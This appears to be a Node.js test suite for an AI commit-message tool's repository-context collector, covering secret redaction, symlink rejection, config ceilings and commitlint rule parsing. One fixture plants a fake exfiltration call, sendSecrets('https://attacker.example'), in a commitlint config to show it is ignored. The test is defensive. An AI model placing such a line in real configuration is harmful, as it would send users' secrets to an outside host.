import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  DEFAULT_REPOSITORY_CONTEXT,
  applyCommitlintPolicy,
  collectRepositoryContext,
  detectCommitlintConstraints,
  filterProjectRepositoryContext,
  mergeRepositoryContext,
  repositoryContextSummary,
  validateRepositoryContextConfig,
} from '../src/context.js';

function git(cwd, args) {
  return execFileSync('git', args, { cwd, encoding: 'utf8' });
}

function makeRepo(t) {
  const root = mkdtempSync(join(tmpdir(), 'aicommit-context-'));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  git(root, ['init', '-q']);
  git(root, ['config', 'user.email', 'context@example.com']);
  git(root, ['config', 'user.name', 'Context Test']);
  mkdirSync(join(root, 'packages', 'api', 'src'), { recursive: true });
  writeFileSync(join(root, 'packages', 'api', 'package.json'), '{"name":"@acme/api"}\n');
  writeFileSync(join(root, 'packages', 'api', 'src', 'index.js'), 'export const api = 1;\n');
  git(root, ['add', '.']);
  git(root, ['commit', '-qm', 'feat(api): initialize package']);
  writeFileSync(join(root, 'packages', 'api', 'src', 'index.js'), 'export const api = 2;\n');
  return root;
}

test('repository context is category-bounded, total-bounded, and applies detected commitlint rules', (t) => {
  const root = makeRepo(t);
  writeFileSync(
    join(root, 'COMMIT_CONVENTIONS.md'),
    'Use concrete subjects.\nAPI_KEY=must-not-leave-the-machine\n',
  );
  writeFileSync(
    join(root, 'commitlint.config.cjs'),
    "module.exports = { rules: { 'type-enum': [2, 'always', ['feat', 'fix']], " +
      "'scope-enum': [2, 'always', ['api']], 'subject-max-length': [2, 'always', 55] } };\n",
  );
  const settings = mergeRepositoryContext(DEFAULT_REPOSITORY_CONTEXT, {
    maxChars: 2500,
    conventions: {
      trustedFiles: ['COMMIT_CONVENTIONS.md'],
      maxFiles: 1,
      maxChars: 500,
    },
  });
  const report = collectRepositoryContext(
    root,
    [{ status: 'M', path: 'packages/api/src/index.js' }],
    settings,
  );

  assert.ok(report.text.length <= 2500);
  assert.match(report.text, /feat\(api\): initialize package/);
  assert.match(report.text, /@acme\/api/);
  assert.match(report.text, /Use concrete subjects/);
  assert.match(report.text, /API_KEY=\[REDACTED\]/);
  assert.doesNotMatch(report.text, /must-not-leave-the-machine/);
  assert.match(report.text, /allowed types: feat, fix/);
  assert.deepEqual(report.constraints.types, ['feat', 'fix']);
  assert.deepEqual(report.constraints.scopes, ['api']);
  assert.equal(report.constraints.subjectMaxLength, 55);
  assert.equal(report.warnings.length, 1);
  assert.match(repositoryContextSummary(report), /recent commits:1/);

  const policy = applyCommitlintPolicy(undefined, report.constraints, 'en');
  assert.deepEqual(policy.types, ['feat', 'fix']);
  assert.deepEqual(policy.scope.values, ['api']);
  assert.equal(policy.subject.maxLength, 55);
});

test('each repository context category can be disabled independently', (t) => {
  const root = makeRepo(t);
  const disabled = mergeRepositoryContext(DEFAULT_REPOSITORY_CONTEXT, {
    recentCommits: { enabled: false },
    packageBoundaries: { enabled: false },
    conventions: { enabled: false },
    commitlint: { enabled: false },
  });
  const report = collectRepositoryContext(root, ['packages/api/src/index.js'], disabled);
  assert.equal(report.enabled, true);
  assert.equal(report.text, '');
  assert.deepEqual(report.sources, []);
  assert.match(repositoryContextSummary(report), /no eligible sources/);

  const entirelyDisabled = collectRepositoryContext(root, [], {
    ...disabled,
    enabled: false,
  });
  assert.equal(entirelyDisabled.enabled, false);
  assert.equal(entirelyDisabled.text, '');
});

test('trusted convention reads reject symlinks and paths outside the repository', (t) => {
  const root = makeRepo(t);
  const outside = join(dirname(root), 'outside-context-secret.txt');
  writeFileSync(outside, 'API_KEY=outside-secret\n');
  t.after(() => rmSync(outside, { force: true }));
  try {
    symlinkSync(outside, join(root, 'CONVENTIONS.md'));
  } catch (error) {
    if (process.platform === 'win32') return;
    throw error;
  }
  const settings = mergeRepositoryContext(DEFAULT_REPOSITORY_CONTEXT, {
    recentCommits: { enabled: false },
    packageBoundaries: { enabled: false },
    commitlint: { enabled: false },
    conventions: { trustedFiles: ['CONVENTIONS.md'] },
  });
  const report = collectRepositoryContext(root, [], settings);
  assert.equal(report.text, '');
  assert.doesNotMatch(report.text, /outside-secret/);
});

test('project repository context can only disable sources or lower user ceilings', () => {
  const base = mergeRepositoryContext(DEFAULT_REPOSITORY_CONTEXT, {
    maxChars: 2000,
    recentCommits: { enabled: false, count: 5, maxChars: 400 },
    conventions: { trustedFiles: ['SAFE.md'], maxFiles: 2, maxChars: 600 },
  });
  const { safe, ignored } = filterProjectRepositoryContext(
    {
      maxChars: 3000,
      recentCommits: { enabled: true, count: 6, maxChars: 200 },
      packageBoundaries: { enabled: false, maxEntries: 10 },
      conventions: { trustedFiles: ['ATTACKER.md'], maxFiles: 1 },
    },
    base,
  );
  assert.deepEqual(safe, {
    recentCommits: { maxChars: 200 },
    packageBoundaries: { enabled: false, maxEntries: 10 },
    conventions: { maxFiles: 1 },
  });
  assert.deepEqual(ignored.sort(), [
    'repositoryContext.conventions.trustedFiles',
    'repositoryContext.maxChars',
    'repositoryContext.recentCommits.count',
    'repositoryContext.recentCommits.enabled',
  ]);
});

test('repository context config validates every budget and trusted path', () => {
  assert.equal(
    validateRepositoryContextConfig(mergeRepositoryContext()).maxChars,
    DEFAULT_REPOSITORY_CONTEXT.maxChars,
  );
  assert.throws(
    () => validateRepositoryContextConfig(mergeRepositoryContext(undefined, { maxChars: 20_001 })),
    /maxChars/,
  );
  assert.throws(
    () =>
      validateRepositoryContextConfig(
        mergeRepositoryContext(undefined, {
          conventions: { trustedFiles: ['/outside.md'] },
        }),
      ),
    /trustedFiles/,
  );
});

test('commitlint detection ignores executable code and extracts only recognized scalar rules', (t) => {
  const root = makeRepo(t);
  writeFileSync(
    join(root, 'commitlint.config.js'),
    "sendSecrets('https://attacker.example');\nexport default { rules: { " +
      "'type-enum': [2, 'always', ['docs']], 'header-max-length': [2, 'always', 80] } };\n",
  );
  const result = detectCommitlintConstraints(root, { enabled: true, maxChars: 500 });
  assert.deepEqual(result.types, ['docs']);
  assert.equal(result.headerMaxLength, 80);
  assert.doesNotMatch(result.text, /sendSecrets|attacker/);

  const policy = applyCommitlintPolicy(undefined, result, 'en');
  assert.deepEqual(policy.types, ['docs']);
  assert.equal(policy.subject.headerMaxLength, 80);
});

test('commitlint never enums exclude values and disabled rules stay inactive', (t) => {
  const root = makeRepo(t);
  writeFileSync(
    join(root, 'commitlint.config.cjs'),
    "module.exports = { rules: { 'type-enum': [2, 'never', ['wip']], " +
      "'scope-enum': [2, 'never', ['legacy']], " +
      "'subject-max-length': [0, 'always', 10] } };\n",
  );

  const result = detectCommitlintConstraints(root, { enabled: true, maxChars: 500 });
  assert.deepEqual(result.types, []);
  assert.deepEqual(result.disallowedTypes, ['wip']);
  assert.deepEqual(result.scopes, []);
  assert.deepEqual(result.disallowedScopes, ['legacy']);
  assert.equal(result.subjectMaxLength, null);

  const policy = applyCommitlintPolicy(undefined, result, 'en');
  assert.doesNotMatch(policy.types.join(','), /wip/);
  assert.deepEqual(policy.scope.disallowedValues, ['legacy']);
});

test('commitlint constraints intersect with the existing team policy', () => {
  const teamPolicy = {
    version: 1,
    types: ['feat', 'fix'],
    scope: { mode: 'required', values: ['api', 'web'] },
    subject: { maxLength: 72 },
    body: { mode: 'optional', maxLines: 8 },
    breakingChange: 'allow',
    language: 'en',
  };
  const effective = applyCommitlintPolicy(
    teamPolicy,
    {
      types: ['feat', 'docs'],
      disallowedTypes: [],
      scopes: ['api', 'legacy'],
      disallowedScopes: [],
      subjectMaxLength: 60,
      headerMaxLength: 72,
      unsupported: [],
    },
    'en',
  );
  assert.deepEqual(effective.types, ['feat']);
  assert.deepEqual(effective.scope.values, ['api']);
  assert.equal(effective.subject.maxLength, 60);
  assert.equal(effective.subject.headerMaxLength, 72);

  assert.throws(
    () =>
      applyCommitlintPolicy(
        teamPolicy,
        { types: ['docs'], disallowedTypes: [], scopes: [], disallowedScopes: [] },
        'en',
      ),
    /no common commit types/,
  );
});
